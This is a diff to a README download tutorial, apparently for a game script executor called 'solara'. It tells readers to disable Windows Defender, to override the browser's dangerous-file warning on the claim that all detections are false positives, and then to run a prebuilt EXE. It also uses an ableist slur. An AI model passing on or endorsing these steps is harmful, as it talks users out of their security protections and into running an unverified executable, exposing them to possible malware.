@@ -1,7 +1,8 @@
 # DOWNLOAD TUTORIAL:
 1. (JUST INCASE ANY RETARDS SEE THIS) Disable Windows Defender.
 2. If you see code, click on it and press "Download Zip".
-3. Click solara-main, Files, and run the "Built" Application/EXE. (I CANNOT RENAME SINCE ITS DEPENDENT ON THE FIX, I WILL LOOK INTO IT FURTHER.)
+3. If your browser declines the download, press Ctrl + H, and click "Allow Dangerous File" (probably not the name but whatever) (ITS NOT DANGEROUS, ALL EXECUTORS ARE FALSE POSITIVE, BE SMART.)
+4. Click solara-main, Files, and run the "Built" Application/EXE. (I CANNOT RENAME SINCE ITS DEPENDENT ON THE FIX, I WILL LOOK INTO IT FURTHER.)
 
 
 
